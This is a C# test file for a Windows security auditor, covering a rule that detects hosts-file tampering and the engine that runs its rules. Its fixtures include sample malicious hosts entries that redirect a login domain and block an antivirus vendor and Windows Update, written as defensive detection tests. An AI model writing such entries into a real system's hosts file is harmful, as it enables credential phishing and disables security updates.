        Assert.Empty(await Run(new HostsFileRule(_cleanHostsFile), Context()));
    }

    [Fact]
    public async Task A_hosts_entry_pointing_somewhere_real_is_reported()
    {
        var file = Path.Combine(_scratch, "hosts-redirect");
        File.WriteAllLines(file, ["127.0.0.1 localhost", "10.0.0.5 login.example.com"]);

        var finding = Assert.Single(await Run(new HostsFileRule(file), Context()));
        Assert.Equal("BAL-HOSTS-TAMPERED", finding.RuleId);
        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("login.example.com", finding.Evidence, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Blocking_a_security_vendor_is_reported_even_though_the_address_is_loopback()
    {
        var file = Path.Combine(_scratch, "hosts-blocked");
        File.WriteAllLines(file, ["0.0.0.0 www.avast.com", "0.0.0.0 download.windowsupdate.com"]);

        var finding = Assert.Single(await Run(new HostsFileRule(file), Context()));
        Assert.Contains("avast", finding.Evidence, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task Redirection_and_blocking_are_separate_findings_rather_than_one_muddled_one()
    {
        var findings = await Run(new HostsFileRule(_dirtyHostsFile), Context());

        Assert.Equal(2, findings.Count);
        Assert.Equal(2, findings.Select(f => f.Title).Distinct(StringComparer.Ordinal).Count());
    }

    [Fact]
    public async Task A_hostname_that_merely_contains_a_vendor_name_is_not_mistaken_for_one()
    {
        // "avgle" starts with "avg". Matching substrings rather than whole labels would call
        // a blocked website a blocked antivirus vendor.
        var file = Path.Combine(_scratch, "hosts-lookalike");
        File.WriteAllLines(file, ["0.0.0.0 avgle.example.com", "0.0.0.0 resetpassword.example.com"]);

        Assert.Empty(await Run(new HostsFileRule(file), Context()));
    }

    [Fact]
    public async Task A_large_blocking_list_produces_at_most_one_summarised_finding_not_thousands()
    {
        var file = Path.Combine(_scratch, "hosts-big");
        File.WriteAllLines(file, Enumerable.Range(0, 3000).Select(i => $"0.0.0.0 ad{i}.example.com"));

        Assert.Empty(await Run(new HostsFileRule(file), Context()));
    }

    [Fact]
    public async Task Many_redirections_are_summarised_into_a_single_finding()
    {
        var file = Path.Combine(_scratch, "hosts-many");
        File.WriteAllLines(file, Enumerable.Range(0, 40).Select(i => $"10.0.0.{i} host{i}.example.com"));

        var finding = Assert.Single(await Run(new HostsFileRule(file), Context()));
        Assert.Contains("40", finding.Evidence, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_missing_or_malformed_hosts_file_is_not_an_accusation()
    {
        Assert.Empty(await Run(new HostsFileRule(Path.Combine(_scratch, "does-not-exist")), Context()));

        var malformed = Path.Combine(_scratch, "hosts-malformed");
        File.WriteAllLines(malformed, ["garbage", "1.2.3.4", "   ", "# 9.9.9.9 commented.example.com"]);
        Assert.Empty(await Run(new HostsFileRule(malformed), Context()));
    }

    // ------------------------------------------------------- the engine

    private sealed class ThrowingRule : ISecurityRule
    {
        public string RuleId => "TEST-THROWS";
        public string Name => "A rule that throws";
        public string Rationale => "Exists only to prove one broken rule cannot cost the whole review.";

        public Task<IReadOnlyList<SecurityFinding>> EvaluateAsync(SecurityScanContext context, CancellationToken ct = default) =>
            throw new InvalidOperationException("deliberate");
    }

    private sealed class FixedRule : ISecurityRule
    {
        private readonly SecurityFinding[] _findings;

        public FixedRule(string ruleId, params SecurityFinding[] findings)
        {
            RuleId = ruleId;
            _findings = findings;
        }

        public string RuleId { get; }
        public string Name => "Fixed findings";
        public string Rationale => "Returns whatever it was handed.";

        public Task<IReadOnlyList<SecurityFinding>> EvaluateAsync(SecurityScanContext context, CancellationToken ct = default) =>
            Task.FromResult<IReadOnlyList<SecurityFinding>>(_findings);
    }

    /// <summary>Records progress synchronously; <see cref="Progress{T}"/> posts asynchronously and would race.</summary>
    private sealed class RecordingProgress : IProgress<Ballast.Core.Models.ScanProgress>
    {
        public List<Ballast.Core.Models.ScanProgress> Steps { get; } = [];

        public void Report(Ballast.Core.Models.ScanProgress value) => Steps.Add(value);
    }

    private static SecurityFinding Finding(
        string ruleId,
        FindingSeverity severity,
        string? path,
        string title = "Something") => new()
    {
        RuleId = ruleId,
        Title = title,
        Severity = severity,
        Explanation = "Explanation.",
        Evidence = "Evidence.",
        TargetPath = path,
    };

    [Fact]
    public async Task One_rule_that_throws_does_not_cost_the_rest_of_the_review()
    {
        var auditor = new SecurityAuditor(
        [
            new ThrowingRule(),
            new FixedRule("TEST-OK", Finding("TEST-OK", FindingSeverity.Low, @"C:\x\a.exe")),
        ]);

        var finding = Assert.Single(await auditor.RunRulesAsync(Context()));
        Assert.Equal("TEST-OK", finding.RuleId);
    }

    [Fact]
    public async Task The_same_observation_about_the_same_path_is_reported_once()
    {
        var auditor = new SecurityAuditor(
        [
            new FixedRule("TEST-DUP",
                Finding("TEST-DUP", FindingSeverity.Low, @"C:\x\a.exe"),
                Finding("TEST-DUP", FindingSeverity.High, @"C:\x\A.EXE"),
                Finding("TEST-DUP", FindingSeverity.Low, @"C:\x\b.exe")),
        ]);

        var findings = await auditor.RunRulesAsync(Context());

        Assert.Equal(2, findings.Count);
        // The louder of the two duplicates survives, so de-duplication cannot quietly downgrade.
        Assert.Equal(FindingSeverity.High, findings[0].Severity);
    }

    [Fact]
    public async Task Two_different_observations_about_one_path_are_both_kept()
    {
        var auditor = new SecurityAuditor(
        [
            new FixedRule("TEST-TWO",
                Finding("TEST-TWO", FindingSeverity.Medium, @"C:\x\a.exe", "First thing"),
                Finding("TEST-TWO", FindingSeverity.Medium, @"C:\x\a.exe", "Second thing")),
        ]);

        Assert.Equal(2, (await auditor.RunRulesAsync(Context())).Count);
    }

    [Fact]
    public async Task Findings_come_back_most_urgent_first()
    {
        var auditor = new SecurityAuditor(
        [
            new FixedRule("TEST-ORDER",
                Finding("TEST-ORDER", FindingSeverity.Low, @"C:\x\low.exe"),
                Finding("TEST-ORDER", FindingSeverity.High, @"C:\x\high.exe"),
                Finding("TEST-ORDER", FindingSeverity.Info, @"C:\x\info.exe"),
                Finding("TEST-ORDER", FindingSeverity.Medium, @"C:\x\medium.exe")),
        ]);

        Assert.Equal(
            new[] { FindingSeverity.High, FindingSeverity.Medium, FindingSeverity.Low, FindingSeverity.Info },
            (await auditor.RunRulesAsync(Context())).Select(f => f.Severity));
    }

    [Fact]
    public async Task The_engine_names_every_rule_it_ran_so_the_ui_can_say_what_was_checked()
    {
        var progress = new RecordingProgress();
        var auditor = new SecurityAuditor(AllRules(_cleanHostsFile));

        await auditor.RunRulesAsync(CleanMachine(), progress);

        foreach (var rule in auditor.Rules)
        {
            Assert.Contains(progress.Steps, s => s.CurrentPath == rule.Name);
        }

        Assert.All(progress.Steps, s => Assert.InRange(s.Fraction ?? 0, 0, 1));
    }

    [Fact]
    public async Task Cancellation_stops_the_review_rather_than_being_swallowed_as_a_rule_failure()
    {
        using var cts = new CancellationTokenSource();
        await cts.CancelAsync();

        var auditor = new SecurityAuditor(AllRules(_cleanHostsFile));

        await Assert.ThrowsAnyAsync<OperationCanceledException>(
            () => auditor.RunRulesAsync(CleanMachine(), null, cts.Token));
    }

    [Fact]
    public async Task A_signature_is_looked_up_once_per_file_however_many_rules_ask_for_it()
    {
        var calls = 0;

        var context = new SecurityScanContext
        {
            StartupEntries = [Entry("Thing", TempExe, TempExe)],
            InstalledPrograms = [],
            Signatures = null!,
            SignatureLookup = (_, _) =>
            {
                Interlocked.Increment(ref calls);
                return Task.FromResult(NoSignature);
            },
        };

        await new SecurityAuditor(AllRules(_cleanHostsFile)).RunRulesAsync(context);

        Assert.Equal(1, calls);
    }

    [Fact]
    public async Task A_verifier_that_throws_is_treated_as_unknown_rather_than_as_a_problem()
    {
        var context = new SecurityScanContext
        {
            StartupEntries = [Entry("Thing", ProgramFilesApp, ProgramFilesApp)],
            InstalledPrograms = [],
            Signatures = null!,
            SignatureLookup = (_, _) => throw new UnauthorizedAccessException("no read access"),
        };

        Assert.Empty(await Run(new UnsignedAutostartRule(), context));
    }
}
